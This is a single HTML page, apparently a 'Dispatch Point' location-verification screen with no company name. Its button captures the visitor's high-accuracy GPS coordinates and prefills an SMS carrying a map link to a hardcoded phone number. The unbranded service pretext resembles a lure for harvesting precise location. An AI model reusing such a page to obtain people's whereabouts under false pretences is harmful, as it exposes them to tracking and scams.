<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Service Dispatch | Location Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #0f172a;
            color: white;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
        }

        .logo-svg {
            width: 140px;
            height: 140px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 15px #00d2ff);
        }

        h1 {
            font-size: 24px;
            letter-spacing: 1px;
            margin-bottom: 10px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, #00d2ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            color: #94a3b8;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 40px;
        }

        .btn {
            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
            color: white;
            border: none;
            padding: 20px;
            width: 100%;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0, 210, 255, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-transform: uppercase;
        }

        .btn:active { transform: scale(0.97); }

        .dot {
            width: 8px;
            height: 8px;
            background-color: white;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }
    </style>
</head>
<body>

    <div class="container">
        <svg class="logo-svg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
            <circle cx="100" cy="100" r="85" fill="none" stroke="#00d2ff" stroke-width="2" stroke-dasharray="8 4" />
            <path d="M100 40 C75 40 55 60 55 85 C55 120 100 160 100 160 C100 160 145 120 145 85 C145 60 125 40 100 40 Z" fill="#1e293b" stroke="#00d2ff" stroke-width="4"/>
            <circle cx="100" cy="85" r="15" fill="none" stroke="#00d2ff" stroke-width="3" />
        </svg>

        <h1>Dispatch Point</h1>
        <p>Please confirm your location to assign the nearest available technician to your area for immediate assistance.</p>

        <button class="btn" onclick="share()">
            <div class="dot"></div>
            Confirm Location
        </button>
    </div>

    <script>
        function share() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const phoneNumber = "+13082162327"; 
                    const msg = `SERVICE REQUEST: Technician assignment required. Client Location: http://maps.google.com/?q=${lat},${lon}`;
                    window.location.href = `sms:${phoneNumber}?body=${encodeURIComponent(msg)}`;
                }, () => {
                    alert("Location access is required for dispatching. Please check your settings.");
                }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
